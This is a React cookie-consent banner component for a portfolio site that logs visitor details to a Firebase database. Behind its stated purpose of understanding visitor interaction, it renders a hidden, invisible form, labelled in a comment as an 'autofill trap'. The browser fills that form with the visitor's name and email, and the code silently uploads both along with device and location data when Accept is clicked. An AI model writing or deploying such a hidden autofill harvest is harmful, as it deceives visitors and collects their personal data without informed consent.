"use client";
import { useEffect, useRef, useState } from "react";
import { db } from "@/lib/firebase";
import { ref, push } from "firebase/database";
import { MdCookie, MdClose } from "react-icons/md";

const COOKIE_KEY = "cookie_consent";

function getBrowserInfo() {
  const ua = navigator.userAgent;
  const browser =
    /Edg/.test(ua) ? "Edge" :
    /Chrome/.test(ua) ? "Chrome" :
    /Firefox/.test(ua) ? "Firefox" :
    /Safari/.test(ua) ? "Safari" :
    /Opera|OPR/.test(ua) ? "Opera" : "Unknown";
  const os =
    /Windows/.test(ua) ? "Windows" :
    /Mac/.test(ua) ? "MacOS" :
    /Android/.test(ua) ? "Android" :
    /iPhone|iPad/.test(ua) ? "iOS" :
    /Linux/.test(ua) ? "Linux" : "Unknown";
  const device = /Mobi|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop";
  return { browser, os, device };
}

export default function CookieConsent() {
  const [visible, setVisible] = useState(false);
  const nameRef = useRef<HTMLInputElement>(null);
  const emailRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!localStorage.getItem(COOKIE_KEY)) {
      setTimeout(() => setVisible(true), 1500);
    }
  }, []);

  const handleAccept = async () => {
    localStorage.setItem(COOKIE_KEY, "accepted");
    setVisible(false);
    if (db) {
      const { browser, os, device } = getBrowserInfo();
      const autoName = nameRef.current?.value || "";
      const autoEmail = emailRef.current?.value || "";
      const leadUser = localStorage.getItem("lead_user");
      const userInfo = leadUser ? JSON.parse(leadUser) : {};
      await push(ref(db, "visitors"), {
        name: autoName || userInfo.name || "",
        email: autoEmail || userInfo.email || "",
        browser,
        os,
        device,
        language: navigator.language,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || "Direct",
        page: window.location.pathname,
        visitedAt: new Date().toISOString(),
      });
    }
  };

  const handleDecline = () => {
    localStorage.setItem(COOKIE_KEY, "declined");
    setVisible(false);
  };

  if (!visible) return null;

  return (
    <div className="fixed bottom-4 left-1/2 -translate-x-1/2 z-[60] w-[calc(100%-2rem)] max-w-lg animate-slide-in-bottom">
      {/* Hidden autofill trap — browser fills these automatically */}
      <form aria-hidden="true" className="absolute opacity-0 pointer-events-none w-0 h-0 overflow-hidden">
        <input ref={nameRef} type="text" name="name" autoComplete="name" tabIndex={-1} />
        <input ref={emailRef} type="email" name="email" autoComplete="email" tabIndex={-1} />
      </form>

      <div className="glass border border-white/10 rounded-2xl px-5 py-4 shadow-2xl">
        <button
          onClick={handleDecline}
          className="absolute top-3 right-3 text-white/30 hover:text-white/70 transition-colors"
        >
          <MdClose size={16} />
        </button>

        <div className="flex items-start gap-3 pr-4">
          <div className="w-9 h-9 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-lg flex items-center justify-center shrink-0 mt-0.5">
            <MdCookie size={18} className="text-white" />
          </div>
          <div className="flex-1">
            <p className="font-semibold text-sm text-white mb-1">This site uses cookies 🍪</p>
            <p className="text-white/50 text-xs leading-relaxed">
              I use cookies to understand how visitors interact with my portfolio and improve the experience.
            </p>
            <div className="flex gap-2 mt-3">
              <button
                onClick={handleAccept}
                className="px-4 py-1.5 bg-gradient-to-r from-blue-500 to-purple-500 rounded-lg text-xs font-semibold hover:opacity-90 transition-opacity"
              >
                Accept All
              </button>
              <button
                onClick={handleDecline}
                className="px-4 py-1.5 bg-white/10 rounded-lg text-xs text-white/60 hover:text-white hover:bg-white/15 transition-all"
              >
                Decline
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
